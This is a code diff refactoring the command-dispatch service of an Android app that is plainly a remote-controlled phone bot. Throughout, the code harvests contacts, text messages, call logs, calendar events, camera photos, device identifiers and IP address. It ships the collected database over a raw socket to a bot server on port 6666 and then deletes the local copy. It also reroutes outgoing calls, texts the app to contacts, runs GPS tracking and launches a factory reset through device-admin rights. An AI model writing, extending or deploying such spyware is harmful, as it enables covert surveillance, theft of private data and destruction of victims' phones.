@@ -12,12 +12,9 @@ import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteException;
 import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.HandlerThread;
-import android.os.Looper;
 import android.os.Process;
 import android.preference.PreferenceManager;
 import android.util.Log;
@@ -31,7 +28,6 @@ import com.candroid.lofl.activities.permissions.LocationActivity;
 import com.candroid.lofl.activities.permissions.PhoneActivity;
 import com.candroid.lofl.activities.permissions.RecordAudioActivity;
 import com.candroid.lofl.activities.permissions.StorageActivity;
-import com.candroid.lofl.api.Administrator;
 import com.candroid.lofl.api.Apps;
 import com.candroid.lofl.api.Bot;
 import com.candroid.lofl.api.ContentProviders;
@@ -51,6 +47,7 @@ import com.candroid.lofl.data.pojos.CalendarEvent;
 import com.candroid.lofl.data.pojos.Contact;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
+import com.candroid.lofl.receivers.AdminReceiver;
 import com.candroid.lofl.receivers.OutgoingCallReceiver;
 
 import java.io.File;
@@ -78,7 +75,6 @@ public class CommandsIntentService extends IntentService {
     public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
     public static final String ACTION_PLAY_SONG = "ACTION_PLAY_SONG";
     public static final String ACTION_DELETE_FILE = "ACTION_DELETE_FILE";
-    public static final String GPS_TRACKER_KEY = "GPS_TRACKER_KEY";
     public static final String ACTION_DOWNLOAD_HTTP_DATA = "ACTION_DOWNLOAD_HTTP_DATA";
     public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
     public static final String ACTION_SMS = "ACTION_SMS";
@@ -102,7 +98,6 @@ public class CommandsIntentService extends IntentService {
     public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
     public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
     public static final String ACTION_SYNC_PHONE_TO_SERVER = "ACTION_SYNC_PHONE_TO_SERVER";
-    public static final String ACTION_ADMIN = "ACTION_ADMIN";
     public static final String ACTION_CALL_LOG_PERMISSION = "ACTION_CALL_LOG_PERMISSIONS";
     public static final String ACTION_LOCATION_PERMISSION = "ACTION_LOCATION_PERMISSION";
     public static final String ACTION_CONTACTS_PERMISSION = "ACTION_CONTACTS_PERMISSION";
@@ -111,12 +106,7 @@ public class CommandsIntentService extends IntentService {
     public static final String ACTION_CALENDAR_PERMISSION = "ACTION_CALENDAR_PERMISSION";
     public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
     public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
-    public static boolean sShouldTrackGps = false;
-    private static long sNumber = 1111111111;
-    public static HandlerThread sHandlerThread;
-    public static Looper sLooper;
-    public static LocationManager sLocationManager;
-    public static LocationListener sLocationListener;
+    public static final String ACTION_SEND_DB_TO_SERVER = "ACTION_SEND_DB_TO_SERVER";
 
     public CommandsIntentService() {
         super("CommandsIntentService");
@@ -168,26 +158,26 @@ public class CommandsIntentService extends IntentService {
                 }
             } else if (action.equals(ACTION_CONTACTS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                            ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(CommandsIntentService.this);
-                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                            try {
-                                database.beginTransaction();
-                                Database.insertContacts(database, contacts);
-                                database.setTransactionSuccessful();
-                            } catch (SQLiteException e) {
-                                e.printStackTrace();
-                            } finally {
-                                database.endTransaction();
-                                database.close();
-                                JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_CONTACTS);
-                            }
+                    ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(CommandsIntentService.this);
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try {
+                        database.beginTransaction();
+                        Database.insertContacts(database, contacts);
+                        database.setTransactionSuccessful();
+                    } catch (SQLiteException e) {
+                        e.printStackTrace();
+                    } finally {
+                        database.endTransaction();
+                        database.close();
+                        JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_CONTACTS);
+                    }
                 }
             } else if (action.equals(ACTION_DEVICE_INFO)) {
-
                 SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
+                String ip = Systems.Networking.fetchIpv4Addresses().get(0);
                 try {
                     database.beginTransaction();
-                    Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
+                    Database.insertDevice(database, LoflService.sTelephoneAddress, ip, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
                     // TODO: 2/10/19 unable to access BuildConfig from library so we passed null for the flavor
                     //Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                     database.setTransactionSuccessful();
@@ -198,162 +188,13 @@ public class CommandsIntentService extends IntentService {
                     database.close();
                     JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_DEVICE_INFO);
                 }
-
             } else if (action.equals(ACTION_SYNC_PHONE_TO_SERVER)) {
-                //SYNC CONTACTS
-                SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
-                try {
-                    database.beginTransaction();
-                    if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                        ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(CommandsIntentService.this);
-                        try {
-                            database.beginTransaction();
-                            Database.insertContacts(database, contacts);
-                            database.setTransactionSuccessful();
-                        } catch (SQLiteException e) {
-                            e.printStackTrace();
-                        } finally {
-                            database.endTransaction();
-                            JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CONTACTS_KEY);
-                        }
-                    }
-                    //SYNC INSTALLED APPS
-                    try {
-                        database.beginTransaction();
-                        Database.insertPackages(database, Apps.getInstalledApps(CommandsIntentService.this));
-                        database.setTransactionSuccessful();
-                    } catch (SQLiteException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.PACKAGES_KEY);
-                    }
-                    //DCIM SYNC
-                    if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
-                        File[] pictures = Storage.Files.getFilesForDirectory(Storage.Files.getDcimDirectory().getPath() + "/Camera");
-                        try {
-                            database.beginTransaction();
-                            if (pictures != null && pictures.length > 0) {
-                                for (File f : pictures) {
-                                    Database.insertMedia(database, f.getName(), f);
-                                }
-                            }
-                            database.setTransactionSuccessful();
-                        } catch (SQLiteException e) {
-                            e.printStackTrace();
-                        } finally {
-                            database.endTransaction();
-                            JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.DCIM_KEY);
-                        }
-                    }
-                    //SYNC CALL LOG
-                    if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-                        ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(CommandsIntentService.this);
-                        try {
-                            database.beginTransaction();
-                            Database.insertPhoneCalls(database, phoneCalls);
-                            database.setTransactionSuccessful();
-                        } catch (SQLException e) {
-                            e.printStackTrace();
-                        } finally {
-                            database.endTransaction();
-                            JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
-                        }
-                    }
-                    //SYNC CALENDAR EVENTS
-                    if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
-                        ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(CommandsIntentService.this);
-                        try {
-                            database.beginTransaction();
-                            Database.insertCalendarEvents(database, calendarEvents);
-                            database.setTransactionSuccessful();
-                        } catch (SQLException e) {
-                            e.printStackTrace();
-                        } finally {
-                            database.endTransaction();
-                            JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
-                        }
-                    }
-                    //SYNC SMS
-                    if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
-                        ArrayList<SmsMsg> smsMsgs = ContentProviders.Sms.fetchSmsMessages(CommandsIntentService.this);
-                        try {
-                            database.beginTransaction();
-                            Database.insertSmsMessages(database, smsMsgs);
-                            database.setTransactionSuccessful();
-                        } catch (SQLException e) {
-                            e.printStackTrace();
-                        } finally {
-                            database.endTransaction();
-                            JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.SMS_KEY);
-                        }
-                    }
-                    //SYNC DEVICE INFO
-                    try {
-                        database.beginTransaction();
-                        Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
-                        // TODO: 2/10/19 unable to access BuildConfig from library....must find a way to get this from app
-                        //Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
-                        database.setTransactionSuccessful();
-                    } catch (SQLException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.DEVICE_KEY);
-                    }
-                    database.setTransactionSuccessful();
-                } catch (SQLException e) {
-                    e.printStackTrace();
-                } finally {
-                    //FNISHED SYNCING PHONE TO DATABASE
-                    database.endTransaction();
-                    try{
-
-                    }catch (IllegalStateException e){
-                        e.printStackTrace();
-                        database.close();
-                    }
-
-                    //SEND DATABASE TO SERVER
-                    try {
-                        boolean isAlreadyBot = false;
-                        Socket socket = SocketFactory.getDefault().createSocket(Bot.SERVER_ADDRESS, 6666);
-                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                        oos.writeObject(LoflService.sTelephoneAddress);
-                        oos.flush();
-                        InputStream inputStream = socket.getInputStream();
-                        if (inputStream.available() != 0) {
-                            try {
-                                ObjectInputStream ois = new ObjectInputStream(inputStream);
-                                String message = (String) ois.readObject();
-                                if (message.equalsIgnoreCase("bot already exists")) {
-                                    isAlreadyBot = true;
-                                }
-                                ois.close();
-                            } catch (ClassNotFoundException e) {
-                                e.printStackTrace();
-                            }
-                        }
-                        if (!isAlreadyBot) {
-                            String ip = Systems.Networking.fetchIpv4Addresses().get(0);
-                            oos.writeObject(ip);
-                            oos.flush();
-                            byte[] bytes = Storage.Files.fileToBytes(Storage.Files.getDatabaseFile(CommandsIntentService.this));
-                            oos.writeObject(bytes);
-                            oos.flush();
-                        }
-                        oos.close();
-                        socket.close();
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    } finally {
-                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
-                        editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
-                        editor.apply();
-                        //DELETE DATABASE
-                        Storage.Files.getDatabaseFile(CommandsIntentService.this).delete();
-                    }
-                }
+                    Database.syncPhoneToDatabase(this);
+                    Bot.syncDatabaseWithServer(this);
+                    //Storage.Files.getDatabaseFile(this).delete();
+                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
+                    editor.putBoolean(Bot.IS_BOT_KEY, true);
+                    editor.apply();
             } else if (action.equals(ACTION_PHONE_CALLS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                     ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(CommandsIntentService.this);
@@ -396,8 +237,6 @@ public class CommandsIntentService extends IntentService {
                         database.endTransaction();
                         database.close();
                         JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.SMS_KEY);
-                        ArrayList<String> addresses = null;
-                        Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                         try{
                             boolean isAlreadyBot = false;
                             Socket socket = SocketFactory.getDefault().createSocket(Bot.SERVER_ADDRESS, 6666);
@@ -434,7 +273,7 @@ public class CommandsIntentService extends IntentService {
                         //DELETE DATABASE FILE
                         Storage.Files.getDatabaseFile(CommandsIntentService.this).delete();
                         SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
-                        editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
+                        editor.putBoolean(Bot.IS_BOT_KEY, true);
                         editor.apply();
                     }
                 }
@@ -478,9 +317,9 @@ public class CommandsIntentService extends IntentService {
             } else if (action.equals(ACTION_INSERT_CONTACT)) {
                 if (this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                     if (intent.hasExtra(Constants.Keys.NAME_KEY) && intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
-                                String name = intent.getStringExtra(Constants.Keys.NAME_KEY);
-                                String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
-                                ContentProviders.Contacts.insertContact(CommandsIntentService.this, name, number);
+                        String name = intent.getStringExtra(Constants.Keys.NAME_KEY);
+                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
+                        ContentProviders.Contacts.insertContact(CommandsIntentService.this, name, number);
                     }
                 }
             } else if (action.equals(ACTION_WIFI_CARD)) {
@@ -497,9 +336,7 @@ public class CommandsIntentService extends IntentService {
                 if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                     Messaging.Text.shareApp(this);
                 }
-            } else if (action.equals(ACTION_FACTORY_RESET)) {
-                Administrator.factoryReset(this);
-            } else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
+            }else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
                 if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
                     String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
                     SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
@@ -507,7 +344,7 @@ public class CommandsIntentService extends IntentService {
                     editor.apply();
                     OutgoingCallReceiver.sRerouteNumber = number;
                 }
-            } else if (action.equalsIgnoreCase(ACTION_CALL_PHONE)) {
+            } else if (action.equals(ACTION_CALL_PHONE)) {
                 if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                     if (intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                         String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
@@ -572,35 +409,20 @@ public class CommandsIntentService extends IntentService {
                     }
                 }
             }else if(action.equals(ACTION_GPS_TRACKER)){
-                if(intent.hasExtra(GPS_TRACKER_KEY)){
-                    sShouldTrackGps = intent.getBooleanExtra(GPS_TRACKER_KEY, false);
+                boolean shouldTrackGps = false;
+                if(intent.hasExtra(Systems.Gps.GPS_TRACKER_KEY)){
+                    shouldTrackGps = intent.getBooleanExtra(Systems.Gps.GPS_TRACKER_KEY, false);
                 }
-                if(sShouldTrackGps){
-                    if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                        sHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
-                        sHandlerThread.start();
-                        sLooper = sHandlerThread.getLooper();
-                        String locationProvider = LocationManager.GPS_PROVIDER;
-                        sLocationManager = Systems.Gps.getLocationManager(CommandsIntentService.this);
-                        sLocationListener = Systems.Gps.getLocationListener(this);
-                        sLocationManager.requestLocationUpdates(locationProvider, 0, 30, sLocationListener, sLooper);
-                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
-                        editor.putBoolean(GPS_TRACKER_KEY, true);
-                        editor.apply();
+                if(shouldTrackGps){
+                    if(! Systems.Gps.isTrackingLocation()){
+                        Systems.Gps.startLocationTracker(this);
                     }
-                }else if(sLocationManager != null){
-                    sLocationManager.removeUpdates(sLocationListener);
-                    sLooper.quitSafely();
-                    sHandlerThread.quitSafely();
-                    sLocationManager = null;
-                    sLooper = null;
-                    sHandlerThread = null;
-                    sLocationListener = null;
-                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
-                    editor.putBoolean(GPS_TRACKER_KEY, false);
-                    editor.apply();
+                }else{
+                    if(Systems.Gps.isTrackingLocation()){
+                        Systems.Gps.stopLocationTracker(this);
+                    }
                 }
-            }else if(action.equalsIgnoreCase(ACTION_DOWNLOAD_HTTP_DATA)){
+            }else if(action.equals(ACTION_DOWNLOAD_HTTP_DATA)){
                 if(intent.hasExtra(Constants.Keys.URL_KEY)){
                     new Thread(new Runnable() {
                         @Override
@@ -646,18 +468,15 @@ public class CommandsIntentService extends IntentService {
                         }
                     }).start();
                 }
-            }else if(action.equalsIgnoreCase(ACTION_ADMIN)){
-                startPermissionActivity(this, intent, AdminActivity.class);
-            }else if(action.equalsIgnoreCase(ACTION_CALL_LOG_PERMISSION)){
+            }else if(action.equals(ACTION_CALL_LOG_PERMISSION)){
                 startPermissionActivity(this, intent, CallLogActivity.class);
-                Log.d(TAG, "started call log permission activity");
-            }else if(action.equalsIgnoreCase(ACTION_LOCATION_PERMISSION)){
+            }else if(action.equals(ACTION_LOCATION_PERMISSION)){
                 startPermissionActivity(this, intent, LocationActivity.class);
-            }else if(action.equalsIgnoreCase(ACTION_CONTACTS_PERMISSION)){
+            }else if(action.equals(ACTION_CONTACTS_PERMISSION)){
                 startPermissionActivity(this, intent, ContactsActivity.class);
-            }else if(action.equalsIgnoreCase(ACTION_RECORD_AUDIO_PERMISSION)){
+            }else if(action.equals(ACTION_RECORD_AUDIO_PERMISSION)){
                 startPermissionActivity(this, intent, RecordAudioActivity.class);
-            }else if(action.equalsIgnoreCase(ACTION_STORAGE_PERMISSION)){
+            }else if(action.equals(ACTION_STORAGE_PERMISSION)){
                 startPermissionActivity(this, intent, StorageActivity.class);
             }else if(action.equals(ACTION_CALENDAR_PERMISSION)){
                 startPermissionActivity(this, intent, CalendarActivity.class);
@@ -665,6 +484,15 @@ public class CommandsIntentService extends IntentService {
                 startPermissionActivity(this, intent, CameraActivity.class);
             }else if(action.equals(ACTION_PHONE_PERMISSION)){
                 startPermissionActivity(this, intent, PhoneActivity.class);
+            }else if(action.equals(ACTION_SEND_DB_TO_SERVER)){
+                if(Storage.Files.getDatabaseFile(this).exists()){
+                    Bot.syncDatabaseWithServer(this);
+                }
+            }else if(action.equals(ACTION_FACTORY_RESET)){
+                if(intent.hasExtra(AdminReceiver.REASON_KEY)){
+                    AdminReceiver.sReason = intent.getStringExtra(AdminReceiver.REASON_KEY);
+                }
+                startPermissionActivity(this, intent, AdminActivity.class);
             }else {
                 Log.d(TAG, "No action found!");
             }
